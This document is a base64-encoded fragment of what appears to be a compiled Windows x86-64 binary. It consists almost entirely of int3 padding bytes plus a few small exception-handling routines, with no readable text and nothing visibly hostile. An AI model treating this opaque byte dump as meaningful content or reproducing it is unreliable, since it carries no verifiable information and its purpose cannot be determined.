MzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMZmYPH4QAAAAAAP/gzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMQFVIg+wgSIvqD7ZNIOgqnv//kEiDxCBdw8zMzMzMzMxAVUiD7CBIi+roOp///5APtk0g6ASe//+QSIPEIF3DzMzMzMzMzMzMzMzMzMzMzMxAVUiD7DBIi+pIiU04SItFOEiLAIsAiUU0SItFOItNNEiJRCQoiUwkIEyNDXCl//9Mi0Vgi1VYSItNUOhun///kEiDxDBdw8zMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMxAVUiD7CBIi+pIiU1ISItFSEiLAIsAiUUki0UkPQUAAMB1CcdFIAEAAADrB8dFIAAAAACLRSBIg8QgXcPMzMzMzMzMzMzMzMzMzMzMzMzMzEBVSIPsIEiL6kiLATPJgTiIE21AD5TBi8FIg8QgXcPMzMzMzMzMzMzMzMzMzMzMzEBVSIPsIEiL6kiLATPJgTiIE21AD5TBi8FIg8QgXcPMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMz